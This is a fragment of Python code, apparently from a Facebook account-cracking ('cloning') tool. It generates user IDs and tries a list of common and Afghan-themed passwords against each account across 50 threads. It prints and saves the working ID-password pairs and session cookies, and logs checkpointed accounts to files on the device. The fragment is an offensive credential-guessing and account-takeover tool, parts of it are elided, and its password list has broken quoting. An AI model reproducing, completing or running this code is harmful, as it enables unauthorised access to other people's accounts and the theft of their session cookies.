...
def afg():
    ...
    os.system("clear")
    print(logo)    
    limit = int(input('\033[1;97m[~] Cloning limit : \033[1;91m1000, 2000, 3000, 5000,10000,15000,20000\n\033[1;97m====================================================\n\033[1;97m[~] Put Limit :\033[1;92m '))
    ...
    with ThreadPool(max_workers=50) as basir:
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','100200,"600700,"123456,"afghan1234,"afghan12345,"kabul123,"kabul1234,"kabul12345,"khan123,"khankhan,"900800,"098765,"]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[wahdat😜-OK]  ' +uid+ ' | ' +ps+'  \n\033[1;37m[] COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/wahdat😥-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;31m[wahdat-CP]  ' +uid+ ' | ' +ps+'  \33[0;97m')
                open('/sdcard/wahdat-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
